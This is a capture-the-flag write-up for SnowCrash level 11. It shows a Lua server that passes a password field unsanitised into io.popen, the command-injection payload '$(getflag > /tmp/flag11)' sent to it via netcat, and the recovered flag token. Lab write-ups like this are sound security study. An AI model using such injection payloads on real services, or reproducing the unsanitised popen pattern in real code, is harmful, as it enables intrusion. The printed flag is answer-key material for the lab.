nc 127.0.0.1 5151

prompt password : $(getflag > /tmp/flag11)

flag => fa6v5ateaw21peobuub8ipe6s
# Flag 11

In level11 home directory we have a lua script after running it we got the error:

```
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```
it means that probably the script is already running in backround.
the script listening on the `127.0.0.1` local ip port `5151`
```
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
The script main functionality is not useful at all.
we need just to exploit the popen function that execute a command.
so we send our getflag command in the password promt after connecting to the host with port 5151 with netcat.
and we got our flag (so easy !) 🙃.
```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: $(getflag > /tmp/flag11)
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

```